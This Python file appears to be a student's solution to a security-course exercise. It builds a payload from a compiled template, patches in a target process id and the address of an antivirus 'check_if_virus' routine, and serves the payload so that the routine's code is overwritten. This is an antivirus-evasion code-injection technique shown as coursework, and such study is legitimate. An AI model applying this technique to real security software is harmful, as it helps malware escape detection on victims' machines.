import addresses
import evasion
import sys


from infosec.core import assemble


class SolutionServer(evasion.EvadeAntivirusServer):

    def get_payload(self, pid: int) -> bytes:
        """Returns a payload to replace the check_if_virus code.

        Notes:
        1. You can assume we already compiled q2.c into q2.template.
        2. Use addresses.CHECK_IF_VIRUS_CODE (and addresses.address_to_bytes).
        3. If needed, you can use infosec.core.assemble.

        Returns:
             The bytes of the payload.
        """
        PATH_TO_TEMPLATE = './q2.template'

        file = open(PATH_TO_TEMPLATE,'rb')
        payload = bytearray(file.read())
        
        # Get the values (the real values)
        process_id = pid.to_bytes(4, byteorder = sys.byteorder)
        address = addresses.address_to_bytes(addresses.CHECK_IF_VIRUS_CODE) 
        
        # Replace real values with placeholders
        payload = payload.replace(addresses.address_to_bytes(0x12345678), process_id)
        payload = payload.replace(addresses.address_to_bytes(0x11111111), address)
        
        return bytes(payload)
        


    def print_handler(self, product: bytes):
        # WARNING: DON'T EDIT THIS FUNCTION!
        print(product.decode('latin-1'))

    def evade_antivirus(self, pid: int):
        # WARNING: DON'T EDIT THIS FUNCTION!
        self.add_payload(
            self.get_payload(pid),
            self.print_handler)


if __name__ == '__main__':
    SolutionServer().run_server(host='0.0.0.0', port=8000)
